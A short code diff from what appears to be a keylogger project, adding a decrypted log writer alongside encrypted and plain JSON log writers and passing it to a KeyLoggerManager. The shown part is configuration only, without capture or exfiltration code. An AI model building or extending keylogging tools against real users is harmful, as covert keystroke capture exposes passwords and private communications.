@@ -9,10 +9,12 @@ if __name__ == "__main__":
     console_log_writer = ConsoleLogWriter()
     txt_log_writer = FileLogWriter("log1")
     json_log_writer = JsonLogWriter("file1_new")
-    encrypted_log_writer = JsonLogWriter("file1_new_encrypted")
+    encrypted_log_writer = JsonLogWriter("file1_new_encrypted")  # for debugging purposes
+    decrypted_log_writer = JsonLogWriter("file1_new_decrypted")  # for debugging purposes
     encryptor = XorEncryption()
     interval = 10  # Log collection interval in seconds
 
     # Start the keylogger manager
-    manager = KeyLoggerManager(keylogger, json_log_writer, encrypted_log_writer, encryptor, interval)
+    manager = KeyLoggerManager(keylogger, json_log_writer, encrypted_log_writer, decrypted_log_writer, encryptor,
+                               interval)
     manager.start()
